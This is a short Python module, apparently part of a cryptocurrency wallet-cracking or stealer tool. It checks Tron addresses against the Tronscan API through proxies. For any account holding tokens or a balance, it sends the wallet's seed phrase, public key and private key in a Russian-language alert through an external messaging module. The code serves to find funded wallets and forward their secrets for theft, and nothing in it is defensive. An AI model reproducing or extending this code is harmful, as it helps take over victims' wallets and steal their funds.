import requests

import mes
from Ac import Ac
import Proxi


def Tron(ac: Ac):
    url = f"https://apilist.tronscan.org/api/account?address={ac.public_key_Tron}"
    try:
        response = requests.get(url, proxies=Proxi.procs.GetProxi())
        if response.status_code == 200:
            data = response.json()
            if len(data['tokens']) > 1:
                mess(ac)
            elif data['tokens'][0]['amount'] != '0.000000':
                mess(ac)
    except requests.exceptions.ProxyError:
        pass
    except requests.exceptions.ConnectionError:
        pass
    except requests.exceptions.SSLError:
        pass
    # print("T")

def mess(ac):
    mes.mes(f"""
🩸в крипте под id Tore обнарузено транзаксий🩸
🩸даний:🩸
🩸сикретная фраза: {ac.seed_phrase}🩸
🩸публичний клуч: {ac.public_key}🩸
🩸приватний клуч: {ac.private_key}🩸""")
